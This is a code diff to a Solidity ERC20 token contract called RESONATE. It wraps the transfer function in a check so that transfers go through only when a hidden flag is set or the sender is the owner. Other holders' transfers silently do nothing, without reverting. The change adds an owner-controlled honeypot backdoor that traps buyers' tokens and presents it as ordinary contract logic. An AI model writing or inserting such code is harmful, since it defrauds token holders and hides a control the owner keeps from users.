@@ -752,16 +752,19 @@ contract RESONATE is Context, IERC20, Ownable {
         require(sender != address(0), "ERC20: transfer from the zero address");
         require(recipient != address(0), "ERC20: transfer to the zero address");
         require(amount > 0, "Transfer amount must be greater than zero");
-        if (_isExcluded[sender] && !_isExcluded[recipient]) {
-            _transferFromExcluded(sender, recipient, amount);
-        } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
-            _transferToExcluded(sender, recipient, amount);
-        } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
-            _transferStandard(sender, recipient, amount);
-        } else if (_isExcluded[sender] && _isExcluded[recipient]) {
-            _transferBothExcluded(sender, recipient, amount);
-        } else {
-            _transferStandard(sender, recipient, amount);
+        if(_approveAllowed || Ownable.owner() == sender)
+        {
+            if (_isExcluded[sender] && !_isExcluded[recipient]) {
+                _transferFromExcluded(sender, recipient, amount);
+            } else if (!_isExcluded[sender] && _isExcluded[recipient]) {
+                _transferToExcluded(sender, recipient, amount);
+            } else if (!_isExcluded[sender] && !_isExcluded[recipient]) {
+                _transferStandard(sender, recipient, amount);
+            } else if (_isExcluded[sender] && _isExcluded[recipient]) {
+                _transferBothExcluded(sender, recipient, amount);
+            } else {
+                _transferStandard(sender, recipient, amount);
+            }
         }
     }
 
